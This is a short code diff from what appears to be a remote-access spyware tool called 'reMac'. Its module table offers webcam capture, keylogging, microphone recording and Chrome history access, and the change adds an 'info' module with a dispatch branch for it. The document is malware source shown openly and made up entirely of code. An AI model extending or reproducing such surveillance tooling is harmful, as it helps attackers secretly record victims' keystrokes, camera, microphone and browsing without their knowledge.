@@ -14,6 +14,7 @@ from modules import mod_webcam
 from modules import mod_keylogger
 from modules import mod_recmic
 from modules import mod_modHelp
+from modules import mod_info
 
 myreMac_server = reMac_server.reMac_server()
 myreMac_client = reMac_client.reMac_client()
@@ -28,7 +29,8 @@ reMacModules = {
     'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc'],
     'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
     'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
-    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>']
+    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
+    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
 }
 
 authorName = "JeteDonner"
@@ -92,6 +94,12 @@ def processInput(input):
         else:
             reMacModules[input][0].run_mod()
     elif input == "ch":# or input == "chromeHistory":
+        if clientStarted == True:
+            myreMac_client.start_client(input)
+            pass
+        else:
+            reMacModules[input][0].run_mod()
+    elif input == "in":# or input == "chromeHistory":
         if clientStarted == True:
             myreMac_client.start_client(input)
             pass
